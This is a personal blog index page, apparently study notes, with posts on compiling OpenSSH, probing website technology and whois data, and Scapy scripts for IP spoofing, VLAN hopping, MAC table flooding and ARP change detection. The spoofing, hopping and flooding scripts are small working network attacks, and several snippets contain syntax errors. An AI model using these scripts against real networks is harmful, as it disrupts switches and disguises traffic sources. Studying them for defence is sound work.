<h3 id="编译安装Openssh"><a href="#编译安装Openssh" class="headerlink" title="编译安装Openssh"></a>编译安装Openssh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）配置</span><br><span class="line">  ./configure --prefix=/usr --with-pam</span><br><span class="line">   --with-zlib --with-md5-passwords</span><br><span class="line">（<span class="number">2</span>）安装</span><br><span class="line">  make &amp;&amp; make install</span><br><span class="line"> (<span class="number">3</span>)检查OpenSSH</span><br><span class="line"> ssh -V</span><br><span class="line"></span><br><span class="line"> 注意点：安装的配置文件在/usr/etc/sshd_config</span><br><span class="line"> 安装完ssh要重新生成一个key 之前保存在其他机器中的key不能使用得先删掉</span><br><span class="line"> 然后让ssh重新获取！！！</span><br><span class="line"> 生成key的命令ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-IP-spoofing" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/03/IP-spoofing/" class="article-date">
      <time datetime="2016-07-03T05:22:23.000Z" itemprop="datePublished">2016-07-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/03/IP-spoofing/">IP spoofing</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">IP-Spoofing is the forgery of IP addresses. The source address is not</span><br><span class="line">the IP of the real network device the packet was sent over, but manually</span><br><span class="line">inserted one. Attackers use this technique either to hide the source of</span><br><span class="line">the attack or to circumvent a packet-filter or other security layers like</span><br><span class="line">tcp wrapper that block or accept connections depending on their source ip</span><br><span class="line">address.</span><br><span class="line">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> send, IP, ICMP</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> sys.argv[<span class="number">0</span>] + <span class="string">" &lt;src_ip&gt; &lt;dst_ip&gt;"</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">packet = IP(src=sys.argv[<span class="number">1</span>], dst=sys.argv[<span class="number">2</span>]) / ICMP()</span><br><span class="line">answer = send(packet)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> answer:</span><br><span class="line">    answer.show()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">Source Code Note:</span><br><span class="line">    We create an IP packet that is included into an ICMP packet by defining</span><br><span class="line">IP() / ICMP(). This somewaht unusual but handy declaration syntax is made</span><br><span class="line">possible by Scapy by overriding the / operator with the help of the __div__</span><br><span class="line">method.</span><br><span class="line">    The IP packet gets the source and destination IP as a parameter. The resulting pa</span><br><span class="line">cket object is dumped on the screen by calling the show() method on it</span><br><span class="line">(show2() would only display layer 2). Afterwards we send it by calling send()</span><br><span class="line">(here too we could use sendp() for layer2). Last but not least if we get any</span><br><span class="line">response packets it is being printed on the screen. Of course we can only</span><br><span class="line">receive a reply if it is sent to our network card. Therefore it could be necessary</span><br><span class="line">to implement a Mitm attack if our host is not connected to the same hub as the target</span><br><span class="line">system. In our case we do not have to care about a Mitm attack,because Scapy inserts</span><br><span class="line">our MAC address as source address and the destination MAC of the destination IP</span><br><span class="line">automatically. Thus we can be sure the reply packet is directly sent back to us.</span><br><span class="line">    You can protect against IP spoofing by signing and encrypting all IP packets.</span><br><span class="line">A common case would be the protocols AH or ESP of the IPSec protocol family.</span><br><span class="line"></span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-探测网站信息" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/03/探测网站信息/" class="article-date">
      <time datetime="2016-07-02T16:27:40.000Z" itemprop="datePublished">2016-07-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/03/探测网站信息/">探测网站信息</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Identifying-the-technology-used-by-a-website"><a href="#Identifying-the-technology-used-by-a-website" class="headerlink" title="Identifying the technology used by a website"></a>Identifying the technology used by a website</h3><p>we need to install builtwith first<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtwith</span><br><span class="line">builtwith.parse(<span class="string">'http://example.webscrapying.com'</span>)</span><br></pre></td></tr></table></figure></p>
<p>we can get the following information:</p>
<p>{u’javascript-frameworks’: [u’jQuery’, u’Modernizr’, u’jQuery UI’],<br>u’web-frameworks’: [u’Web2py’, u’Twitter Bootstrap’],<br>u’programming-languages’: [u’Python’], u’web-servers’: [u’Nginx’]}</p>
<p>This module will take a URL,download and analyze it, and then return<br>the technologies used by the website.</p>
<h3 id="Finding-the-owner-of-a-website"><a href="#Finding-the-owner-of-a-website" class="headerlink" title="Finding the owner of a website"></a>Finding the owner of a website</h3><p>You need to install the module named python-whois</p>
<p>pip install python-whois</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> whois</span><br><span class="line"><span class="keyword">print</span> whois.whois(<span class="string">'weibo.com'</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<blockquote>
<p>print whois.whois(‘weibo.com’)</p>
<p>print whois.whois(‘weibo.com’)<br>{<br>  “updated_date”: [<br>    “2016-03-20 00:00:00”,<br>    “2016-03-20 14:56:29”<br>  ],<br>  “status”: [<br>    “clientDeleteProhibited <a href="https://icann.org/epp#clientDeleteProhibited" target="_blank" rel="external">https://icann.org/epp#clientDeleteProhibited</a>“,<br>    “clientTransferProhibited <a href="https://icann.org/epp#clientTransferProhibited" target="_blank" rel="external">https://icann.org/epp#clientTransferProhibited</a>“,<br>    “clientUpdateProhibited <a href="https://icann.org/epp#clientUpdateProhibited" target="_blank" rel="external">https://icann.org/epp#clientUpdateProhibited</a>“<br>  ],<br>  “name”: “Beijing Weibo Internet Technology Co.,Ltd”,<br>  “dnssec”: “unsigned”,<br>  “city”: “Bei jing”,<br>  “expiration_date”: [<br>    “2026-03-20 00:00:00”,<br>    “2111-03-20 04:00:00”<br>  ],<br>  “zipcode”: “100080”,<br>  “domain_name”: [<br>    “WEIBO.COM”,<br>    “weibo.com”<br>  ],<br>  “country”: “CN”,<br>  “whois_server”: “whois.35.com”,<br>  “state”: “Bei jing”,<br>  “registrar”: “35 Technology Co., Ltd.”,<br>  “referral_url”: “<a href="http://www.35.com" target="_blank" rel="external">http://www.35.com</a>“,<br>  “address”: “Ideal Int’l Plaza, No. 58, West Of North Forth Ring Rd”,<br>  “name_servers”: [<br>    “NS1.SINA.COM.CN”,<br>    “NS2.SINA.COM.CN”,<br>    “NS3.SINA.COM”,<br>    “NS3.SINA.COM.CN”,<br>    “NS4.SINA.COM”,<br>    “NS4.SINA.COM.CN”,<br>    “ns1.sina.com.cn”,<br>    “ns2.sina.com.cn”,<br>    “ns3.sina.com.cn”,<br>    “ns4.sina.com.cn”,<br>    “ns3.sina.com”,<br>    “ns4.sina.com”<br>  ],<br>  “org”: “Beijing Weibo Internet Technology Co., Ltd.”,<br>  “creation_date”: [<br>    “1999-03-20 00:00:00”,<br>    “1999-03-20 04:00:00”<br>  ],<br>  “emails”: [<br>    “abuse@35.cn”,<br>    “domainname@staff.sina.com.cn”<br>  ]<br>}</p>
</blockquote>
</blockquote>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Learning-Scrapy/">Learning Scrapy</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-VLAN-hopping" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/02/VLAN-hopping/" class="article-date">
      <time datetime="2016-07-02T13:24:51.000Z" itemprop="datePublished">2016-07-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/02/VLAN-hopping/">VLAN hopping</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">''</span></span><br><span class="line">Lets say our computer <span class="keyword">is</span> connected to VLAN <span class="number">1</span> <span class="keyword">and</span> </span><br><span class="line">wants to ping another one on VLAN <span class="number">2.</span></span><br><span class="line"><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"c0:d3:de:ad:be:ef"</span>) / Dot1Q(vlan=<span class="number">1</span>) / Dot1Q(vlan=<span class="number">2</span>) /IP(dst=<span class="string">"192.168.13.3"</span> / ICMP()</span><br><span class="line"></span><br><span class="line">sendp(packet)</span><br><span class="line"></span><br><span class="line"><span class="string">'''information</span><br><span class="line"></span><br><span class="line">First we set the header includeing our VLAN tag into the packet and afterwards</span><br><span class="line">the one of the destination host. The switch will remove the first tag, than decide</span><br><span class="line">how to react on the packet, seeing the second tag with VLAN id 2 he decides to forward</span><br><span class="line">it to that vlan. On some switches this attack will only be successful if its connected</span><br><span class="line">to other VLAN enabled switches via stacking, because otherwise they use port based VLAN.</span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-MAC-Flooder" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/02/MAC-Flooder/" class="article-date">
      <time datetime="2016-07-02T09:54:28.000Z" itemprop="datePublished">2016-07-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/02/MAC-Flooder/">MAC-Flooder</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="brief"><a href="#brief" class="headerlink" title="brief"></a>brief</h3><p>Switches like other computers have a limited size of member that’s also true for the table<br>holding MAC address information used by the switch to remember which MAC is on which port<br>as well as its internal ARP cache.Sometimes switches react a bit weirdly if their buffers<br>overflow. This can lead from denial of service up to giving up switching and behaving like<br>a normal hub. In hub mode the overall higher traffic raise is not the only problem you would<br>hav thus all connected computers could see the complete traffic without additional actions.<br>You should test how your switches react on these exceptions and that’s what the next script is<br>good for.It generates random MAC addresses and sends them to your switch until the buffer is full</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(src=RandMAC(<span class="string">"*:*:*:*:*:*"</span>),dst=RandMAC(<span class="string">"*:*:*:*:*:*"</span>)) / \</span><br><span class="line">         IP(src=RandIP(<span class="string">"*.*.*.*"</span>), dst=RandIP(<span class="string">"*.*.*.*"</span>)) / \</span><br><span class="line">         ICMP()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    dev = <span class="string">"eth0"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    dev = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Flooding net with random packets on dev "</span> + dev</span><br><span class="line"></span><br><span class="line">sendp(packet, iface=dev, loop=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ol>
<li>Generate the packet.</li>
<li>use the specific function to send the packet.</li>
</ol>
<p>:) life is short, so use python!</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-ARP-Watcher" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/07/02/ARP-Watcher/" class="article-date">
      <time datetime="2016-07-02T09:36:29.000Z" itemprop="datePublished">2016-07-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/02/ARP-Watcher/">ARP-Watcher</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a>Source code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">This tool reports all newly connected devices to our network</span><br><span class="line"> therefore it has to remember all IP to MAC resolutions.</span><br><span class="line"> Additionally it can detect if a device suddenly changes</span><br><span class="line"> its MAC address.</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> sniff, ARP</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> signal, SIGINT</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arp_watcher_db_file = <span class="string">"/var/cache/arp-watcher.db"</span></span><br><span class="line">ip_mac = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sig_int_handler</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Got SIGINT. Saving ARP database..."</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(arp_watcher_db_file, <span class="string">"w"</span>)</span><br><span class="line">        <span class="keyword">for</span> (ip, mac) <span class="keyword">in</span> ip_mac.items():</span><br><span class="line">            f.write(ip + <span class="string">" "</span> + mac + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Done."</span></span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Cannot write file "</span> + arp_watcher_db_file</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_arp</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="comment">#Got is-at pkt (ARP response)</span></span><br><span class="line">    <span class="keyword">if</span>  pkt[ARP].op == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> pkt[ARP].hwsrc + <span class="string">" "</span> + pkt[ARP].psrc</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Device is new. Remember it.</span></span><br><span class="line">        <span class="keyword">if</span> ip_mac.get(pkt[ARP].psrc) == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Found new device "</span> + pkt[ARP].hwsrc + <span class="string">" "</span> + pkt[ARP].psrc</span><br><span class="line">            ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Device is known but has different IP</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> ip_mac.get(pkt[ARP].psrc) <span class="keyword">and</span> ip_mac[pkt[ARP].psrc] != pkt[ARP].hws</span><br><span class="line">rc:</span><br><span class="line">            <span class="keyword">print</span> pkt[ARP].hwsrc + <span class="string">" has got new ip "</span> + pkt[ARP].psrc + <span class="string">"(old "</span></span><br><span class="line">+ ip_mac[pkt[ARP].psrc] + <span class="string">")"</span></span><br><span class="line"></span><br><span class="line">signal(SIGINT, sig_int_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> sys.argv[<span class="number">0</span>] + <span class="string">" &lt;iface&gt;"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fh = open(arp_watcher_db_file, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Cannot read file "</span> + arp_watcher_db_file</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fh:</span><br><span class="line">    line.chomp()</span><br><span class="line">    (ip, mac) = line.split(<span class="string">" "</span>)</span><br><span class="line">    ip_mac[IP] = mac</span><br><span class="line"></span><br><span class="line">sniff(prn=watch_arp,filter=<span class="string">"arp"</span>, iface=sys.argv[<span class="number">1</span>], store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2016 Dylan Kios
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的静态博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减双栏 Hexo 博客主题">Yelee</a> by MOxFIVE
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >本站到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>




<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>

<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>


<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>